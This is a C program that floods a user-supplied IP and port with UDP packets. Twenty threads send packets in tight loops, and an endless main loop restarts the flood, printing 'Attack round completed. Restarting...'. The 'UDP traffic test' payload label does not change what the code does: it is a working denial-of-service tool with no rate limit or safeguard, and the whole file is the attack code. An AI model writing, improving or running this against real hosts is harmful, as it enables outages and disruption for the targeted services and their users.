#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define BUFFER_SIZE 9000
#define MAX_THREADS 20   // Set to 1 or 2 for fewer threads

// Global variables
char *ip;
int port;
int duration;

// Function to send UDP traffic
void *send_udp_traffic(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    int sent_bytes;

    // Create a socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        close(sock);
        pthread_exit(NULL);
    }

    snprintf(buffer, sizeof(buffer), "UDP traffic test");

    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;

    // Increase the packet sending rate
    while (time(NULL) < end_time) {
        for (int i = 0; i < 1000; i++) {  // Send multiple packets per loop
            sent_bytes = sendto(sock, buffer, strlen(buffer), 0,
                                (struct sockaddr *)&server_addr, sizeof(server_addr));
            if (sent_bytes < 0) {
                perror("Send failed");
                break;  // Break on send failure
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);

    // Check for valid port number
    if (port < 1 || port > 65535) {
        fprintf(stderr, "Invalid port number. Must be between 1 and 65535.\n");
        exit(EXIT_FAILURE);
    }

    pthread_t tid[MAX_THREADS];
    while (1) {  // Loop to restart the attack
        for (int i = 0; i < MAX_THREADS; i++) {
            if (pthread_create(&tid[i], NULL, send_udp_traffic, NULL) != 0) {
                perror("Thread creation failed");
                exit(EXIT_FAILURE);
            }
        }

        for (int i = 0; i < MAX_THREADS; i++) {
            pthread_join(tid[i], NULL);
        }

        // Log completion of this round
        printf("Attack round completed. Restarting...\n");
        sleep(1); // Optional delay between rounds
    }

    return 0;
}
